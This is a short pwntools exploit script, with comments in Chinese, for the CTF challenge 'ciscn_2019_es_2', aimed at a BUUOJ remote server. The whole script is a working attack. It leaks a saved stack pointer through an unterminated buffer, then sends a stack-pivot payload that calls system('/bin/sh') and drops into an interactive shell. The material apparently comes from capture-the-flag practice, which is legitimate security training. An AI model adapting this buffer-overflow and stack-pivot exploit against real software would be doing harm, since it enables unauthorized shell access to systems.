from pwn import *

leave_ret = 0x80484b8
system_addr = 0x8048400

offset_to_s = 0x38
s_buf_len = 0x28


context.os = "linux"
context.arch = "i386"
# context.log_level = "debug"
if args.LOCAL:
    # gdb.debug的方式，32位还是有点问题，(⊙﹏⊙)怎么才能做到优雅地调试呢
    p = gdb.debug("./ciscn_2019_es_2", gdbscript='''
    b *0x8048595
    continue
    ''')
#     p = process("./ciscn_2019_es_2")
#     # 中间的时间差怎么控制呢？
#     gdb.attach(p)
else:
    p = remote("node4.buuoj.cn", 27412)

# p.recvuntil(b"your name?\n")

p.recv()
payload1 = b'A'*s_buf_len

## 妈的，下面这个 sendline()习惯性用法搞得我一直找不到接收地址最后一字节是0x0a的原因
## 坏习惯害死人...
# p.sendline(payload1)
p.send(payload1)

p.recvuntil(payload1)
leaked_old_ebp = u32(p.recv(4))

p.success(hex(leaked_old_ebp))

payload2 = (p32(system_addr)+p32(0xcafebeef)+p32(leaked_old_ebp-offset_to_s+0xc)+b'/bin/sh\x00').ljust(s_buf_len, b'a')
payload2 += p32(leaked_old_ebp-offset_to_s-4)+p32(leave_ret)

p.sendline(payload2)
p.interactive()

